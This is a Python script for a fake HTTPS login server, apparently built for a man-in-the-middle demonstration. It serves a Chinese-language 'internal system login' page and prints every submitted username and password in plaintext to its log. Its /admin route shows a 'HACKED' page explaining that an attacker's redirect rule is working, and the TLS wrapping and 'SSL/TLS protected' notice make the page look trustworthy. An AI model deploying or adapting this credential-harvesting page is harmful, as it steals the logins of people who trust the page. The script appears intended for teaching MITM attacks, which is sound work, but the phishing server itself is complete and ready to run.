#!/usr/bin/env python3
import http.server, ssl
from urllib.parse import parse_qs
LOGIN_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>內部系統登入</title>
    <style>
        body { font-family: Arial; background: #f0f2f5; display: flex;
               justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; padding: 40px; border-radius: 8px;
               box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 320px; }
        h2 { text-align: center; color: #1877f2; margin-top: 0; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd;
                border-radius: 4px; box-sizing: border-box; font-size: 14px; }
        .pw-wrap { position: relative; }
        .pw-wrap input { padding-right: 40px; }
        .eye { position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
               cursor: pointer; font-size: 18px; user-select: none; opacity: 0.6; }
        .eye:hover { opacity: 1; }
        button { width: 100%; padding: 12px; background: #1877f2; color: white;
                 border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
        button:hover { background: #166fe5; }
        .note { color: #888; font-size: 12px; text-align: center; margin-top: 12px; }
    </style>
</head>
<body>
    <div class="box">
        <h2>內部系統登入</h2>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="使用者名稱" required>
            <div class="pw-wrap">
                <input type="password" name="password" id="pw" placeholder="密碼" required>
                <span class="eye" id="eye" onclick="toggle()">👁</span>
            </div>
            <button type="submit">登入</button>
        </form>
        <p class="note">受 SSL/TLS 加密保護 🔒</p>
    </div>
    <script>
        function toggle() {
            const pw = document.getElementById('pw');
            const eye = document.getElementById('eye');
            if (pw.type === 'password') {
                pw.type = 'text';
                eye.textContent = '🙈';
            } else {
                pw.type = 'password';
                eye.textContent = '👁';
            }
        }
    </script>
</body>
</html>
"""
SUCCESS_PAGE = """
<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>登入成功</title></head>
<body style="font-family:Arial; text-align:center; padding-top:100px;">
    <h1>✓ 登入成功</h1>
    <p>歡迎回來，{username}！</p>
</body></html>
"""
ADMIN_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>HACKED</title>
    <style>
        body { font-family: 'Courier New', monospace; background: #000; color: #0f0;
               text-align: center; padding-top: 80px; margin: 0; }
        h1 { font-size: 60px; color: #f00; text-shadow: 0 0 10px #f00; }
        pre { font-size: 18px; color: #0f0; line-height: 1.6; }
        .url { color: #ff0; }
    </style>
</head>
<body>
    <h1>⚠ HACKED ⚠</h1>
    <pre>
你訪問的是 <span class="url">/admin</span>
但你以為自己訪問的是 <span class="url">/</span>

這代表 MITM 的 redirect 規則生效了

&gt;&gt;&gt; 攻擊者已經能任意改寫你的請求路徑 &lt;&lt;&lt;
    </pre>
</body>
</html>
"""
class LoginHandler(http.server.BaseHTTPRequestHandler):
    def _send(self, body, status=200):
        self.send_response(status)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body.encode())))
        self.end_headers()
        self.wfile.write(body.encode())
    def do_GET(self):
        if self.path == "/admin":
            self._send(ADMIN_PAGE)
        else:
            self._send(LOGIN_PAGE)
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode()
        data = parse_qs(body)
        username = data.get("username", [""])[0]
        password = data.get("password", [""])[0]
        # 印在 server 端記錄
        print(f"[LOGIN] username={username} password={password}")
        self._send(SUCCESS_PAGE.format(username=username))
    def log_message(self, format, *args):
        print(f"{self.address_string()} - {format % args}")
server = http.server.HTTPServer(("0.0.0.0", 443), LoginHandler)
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain("cert.pem", "key.pem")
server.socket = ctx.wrap_socket(server.socket, server_side=True)
print("Fake Login HTTPS server on :443")
server.serve_forever()
